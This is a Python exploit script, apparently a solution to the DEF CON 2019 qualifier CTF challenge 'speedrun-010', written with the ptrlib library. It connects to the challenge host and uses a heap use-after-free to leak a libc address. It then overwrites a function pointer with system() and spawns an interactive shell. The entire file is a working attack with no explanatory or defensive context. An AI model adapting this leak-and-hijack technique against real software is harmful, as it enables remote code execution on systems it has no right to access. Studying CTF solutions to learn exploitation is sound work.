from ptrlib import *

def alloc_name(name):
    sock.recvuntil("1, 2, 3, 4, or 5\n")
    sock.send("1")
    sock.recvline()
    sock.send(name)

def alloc_message(msg):
    sock.recvuntil("1, 2, 3, 4, or 5\n")
    sock.send("2")
    sock.recvline()
    sock.send(msg)

def free_name():
    sock.recvuntil("1, 2, 3, 4, or 5\n")
    sock.send("3")

def free_message():
    sock.recvuntil("1, 2, 3, 4, or 5\n")
    sock.send("4")
    
libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
#sock = Process("./speedrun-010")
sock = Socket("speedrun-010.quals2019.oooverflow.io", 31337)

# leak libc
alloc_name("A")
alloc_name("B")
free_name()
free_name()
alloc_name("B" * 0x17)
alloc_message("X" * 0x10)
addr_puts = u64(sock.recvline()[0x18:].rstrip())
libc_base = addr_puts - libc.symbol("puts")
dump("libc base = " + hex(libc_base))

# get the shell
alloc_name("/bin/sh")
alloc_name("/bin/sh")
free_name()
alloc_name("sh;")
payload = b'X' * 0x10
payload += p64(libc_base + libc.symbol("system"))
dump("system = " + hex(libc_base + libc.symbol("system")))
alloc_message(payload)

sock.interactive()
